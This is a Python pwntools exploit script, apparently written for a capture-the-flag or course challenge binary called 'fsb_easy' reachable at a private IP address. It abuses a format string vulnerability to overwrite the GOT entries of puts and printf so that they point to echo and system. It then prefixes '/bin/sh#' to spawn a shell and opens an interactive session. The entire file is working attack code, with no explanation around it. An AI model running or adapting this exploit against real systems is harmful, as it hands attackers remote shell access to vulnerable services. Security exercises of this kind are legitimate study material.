from pwn import *
import argparse
import os


LOCAL_PATH = "./fsb_easy"
REMOTE_PATH = ["10.214.10.18", 15555]

PREFIX = "/bin/sh#"

def get_process(is_remote = False):
    if is_remote:
        return remote(*REMOTE_PATH)
    else:
        return process(LOCAL_PATH)

def send_payload(proc, payload):
    #proc.sendlineafter("=\n\n", PREFIX + payload)
    proc.sendline(PREFIX+payload)
    
def exec_fmt(payload, is_remote = False):
    proc = get_process(is_remote)
    send_payload(proc, payload)
    return proc.recvall()

parser = argparse.ArgumentParser()
parser.add_argument("-r", "--is_remote", help="Connect to remote server?", action="store_true")
args = parser.parse_args()

e = ELF(LOCAL_PATH)
context.binary = e.path

autofmt = FmtStr(exec_fmt)

writes = {e.got['puts']:   e.symbols['echo'], e.got['printf']: e.plt['system']}
log.info("Address of puts() .got.plt: {}".format(hex(e.got['puts'])))
log.info("Address of printf() .got.plt: {}".format(hex( e.got['printf'])))
log.info("Address of vuln(): {}".format(hex(e.symbols['echo'])))
log.info("Address of system() .plt: {}".format(hex(e.plt['system'])))

payload = fmtstr_payload(autofmt.offset, writes, numbwritten=len(PREFIX))
log.info("Payload: {}".format(enhex(payload)))

p = get_process(args.is_remote)
payload1 = '3160104501.6880c7b179fd087c3c9a75917a028647'
p.sendline(payload1)
send_payload(p, payload)
p.interactive()